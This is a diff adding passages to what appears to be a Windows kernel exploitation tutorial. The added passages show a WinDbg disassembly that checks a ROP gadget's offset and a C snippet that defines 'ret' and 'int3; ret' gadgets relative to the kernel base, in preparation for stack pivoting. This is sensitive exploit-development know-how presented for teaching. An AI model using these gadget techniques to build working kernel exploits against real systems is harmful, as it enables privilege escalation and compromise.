@@ -231,6 +231,15 @@ In **WinDbg** we can set a breakpoint on this address:
 1: kd> bp nt+0x639131
 ```
 
+We can also confirm that the ROP gadget is what we think it is:
+
+```
+1: kd> u nt+0x639131
+nt!SymCryptCallbackRandom <PERF> (nt+0x639131):
+fffff800`11039131 c3              ret
+...
+```
+
 When we compile and run the exploit on the target **WinDbg** will break at this address, now we can examine the registers when the bug is triggered:
 
 ```
@@ -251,6 +260,14 @@ fffff800`11039131 c3              ret
 ```
 
 Notice that `r11` is the same value as `rsp`. This will come in handy later when we need to restore the stack upon return to the driver code.
+
+When starting to write an exploit I generally define two gadgets that I can use to debug:
+
+```c
+// ROP Gadgets
+QWORD ROP_NOP = kernelBase + 0x639131;                          // ret ;
+QWORD INT3 = kernelBase + 0x852b70;                             // int3; ret;
+```
 
 ## Stack Pivoting
 
